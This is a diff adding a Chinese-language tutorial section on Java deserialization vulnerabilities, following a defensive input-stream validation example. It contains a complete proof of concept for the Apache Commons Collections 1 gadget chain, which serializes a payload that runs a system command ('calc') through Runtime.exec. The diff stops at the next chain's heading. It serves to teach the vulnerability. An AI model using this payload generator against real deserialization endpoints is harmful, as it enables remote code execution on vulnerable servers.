@@ -242,3 +242,75 @@ public class AntObjectInputStream extends ObjectInputStream {
 ```
 
 用AntObjectInputStream 代替ObjectInputStream可实现反序列化的校验。
+
+
+
+## 详解Java反序列化漏洞
+
+### 0x01 Apache-commons-collections-1
+
+反序列化完整执行链：
+
+![](/img/javadesrialized/acc1.png)
+
+POC:
+
+```Java
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import javax.management.BadAttributeValueExpException;
+
+public class aCC1 {
+    public static void main(String[] args) throws Exception {
+
+        Transformer[] transformers = new Transformer[] {
+                //传入Runtime类
+                new ConstantTransformer(Runtime.class),
+                //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
+                new InvokerTransformer("getMethod",
+                        new Class[] {String.class, Class[].class },
+                        new Object[] {"getRuntime", new Class[0] }),
+                //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
+                new InvokerTransformer("invoke",
+                        new Class[] {Object.class, Object[].class },
+                        new Object[] {null, new Object[0] }),
+                //反射调用exec方法
+                new InvokerTransformer("exec",
+                        new Class[] {String.class },
+                        new Object[] {"calc"})
+        };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map innerMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
+
+        // val是私有变量，所以利用下面方法进行赋值
+        Field valfield = poc.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(poc, entry);
+
+        File f = new File("poc.txt");
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
+        out.writeObject(poc);
+        out.close();
+
+    }
+
+}
+
+```
+
+### 0x02 Apache-commons-collections-2
+
